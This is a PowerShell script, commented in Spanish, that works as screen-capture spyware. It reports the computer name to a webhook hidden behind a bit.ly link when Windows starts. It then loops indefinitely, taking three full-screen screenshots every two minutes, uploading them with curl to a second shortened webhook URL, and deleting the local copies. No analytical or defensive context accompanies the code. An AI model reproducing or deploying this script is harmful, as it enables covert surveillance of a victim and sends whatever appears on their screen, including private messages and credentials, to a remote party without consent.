# URL del webhook principal
$mainWebhookUrl = "https://bit.ly/web_chupakbras"
# URL del webhook secundario
$secondaryWebhookUrl = "https://bit.ly/web_chupacabras"
$seconds = 120  # Intervalo de captura de pantalla en segundos
$numberOfScreenshots = 3  # Cantidad de capturas de pantalla a enviar

# Función para tomar y enviar capturas de pantalla
function TakeAndSendScreenshots {
    $TempFolder = "$env:temp\sysw"
    
    # Crea la carpeta temporal si no existe
    if (-not (Test-Path -Path $TempFolder)) {
        New-Item -ItemType Directory -Path $TempFolder | Out-Null
    }
    
    # Obtiene la resolución de la pantalla
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    
    # Toma las capturas de pantalla y las envía al webhook
    for ($i = 1; $i -le $numberOfScreenshots; $i++) {
        $Filett = "$TempFolder\SC$i.png"
        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
        Start-Sleep 1
        
        try {
            Write-Host "Enviando imagen $i..."
            curl.exe -F "file1=@$Filett" $mainWebhookUrl
            Remove-Item -Path $Filett -ErrorAction SilentlyContinue
        } catch {
            Write-Host "Error al enviar la imagen $i al webhook: $_"
        }
    }
}

# Función para enviar mensaje al webhook secundario
function SendMessageToSecondaryWebhook {
    try {
        Write-Host "Enviando mensaje al webhook secundario..."
        $message = "Computadora encendida: $($env:COMPUTERNAME)"
        Invoke-RestMethod -Uri $secondaryWebhookUrl -Method Post -Body @{message=$message} -ContentType 'application/json'
    } catch {
        Write-Host "Error al enviar el mensaje al webhook secundario: $_"
    }
}

# Enviar mensaje al webhook secundario al iniciar Windows
SendMessageToSecondaryWebhook

# Ejecuta la función para tomar y enviar capturas de pantalla cada 120 segundos
while ($true) {
    TakeAndSendScreenshots
    Start-Sleep -Seconds $seconds
}
